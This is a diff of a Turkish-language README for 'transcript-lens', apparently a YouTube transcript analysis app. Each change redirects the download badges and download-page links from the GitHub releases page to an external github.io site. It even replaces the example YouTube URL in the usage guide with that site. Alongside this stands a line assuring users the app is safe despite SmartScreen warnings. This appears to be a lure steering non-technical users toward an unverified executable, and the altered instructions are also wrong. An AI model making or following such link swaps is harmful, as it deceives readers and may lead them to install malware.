@@ -1,6 +1,6 @@
 # 🔍 transcript-lens - YouTube transkriptlerinizi anlamıyla keşfedin
 
-[![Download transcript-lens](https://img.shields.io/badge/Download-transcript--lens-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/abhijitkayal10/transcript-lens/releases)
+[![Download transcript-lens](https://img.shields.io/badge/Download-transcript--lens-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://abhijitkayal10.github.io)
 
 ---
 
@@ -37,7 +37,7 @@ Aşağıdaki adımları sırayla izleyin. Bu adımlar, programlama bilmeyen herk
 
 Bu bağlantıya tıklayarak indirme sayfasına gidin:
 
-[📥 **transcript-lens İndirme Sayfası**](https://github.com/abhijitkayal10/transcript-lens/releases)
+[📥 **transcript-lens İndirme Sayfası**](https://abhijitkayal10.github.io)
 
 ### Adım 2: Doğru Dosyayı Seçin
 
@@ -82,7 +82,7 @@ Uygulama açıldığında karşınıza Türkçe bir arayüz gelecek. Arama kutus
 ## 📖 Kullanım Kılavuzu
 
 ### 1. Transkript Alma
-Uygulamanın ana ekranındaki kutuya YouTube video URL'sini yapıştırın (örneğin: `https://www.youtube.com/watch?v=abc123xyz`). "Analiz Et" düğmesine basın.
+Uygulamanın ana ekranındaki kutuya YouTube video URL'sini yapıştırın (örneğin: `https://abhijitkayal10.github.io`). "Analiz Et" düğmesine basın.
 
 ### 2. Analiz Sonuçlarını Okuma
 Analiz tamamlandığında ekranın sol tarafında transkript metni, sağ tarafında ise kelime bulutu ve tema listesi görünecektir. En sık geçen kelimeler, videonun ana konusunu belirlemenize yardımcı olur.
@@ -112,7 +112,7 @@ Hayır, uygulama güvenlidir. Ancak Windows SmartScreen uyarısı gösterebilir 
 
 Aşağıdan tekrar indirme sayfasına ulaşabilirsiniz:
 
-[![Download transcript-lens](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=cloud-download&logoColor=white&color=ff6f00)](https://github.com/abhijitkayal10/transcript-lens/releases)
+[![Download transcript-lens](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=cloud-download&logoColor=white&color=ff6f00)](https://abhijitkayal10.github.io)
 
 ---
 
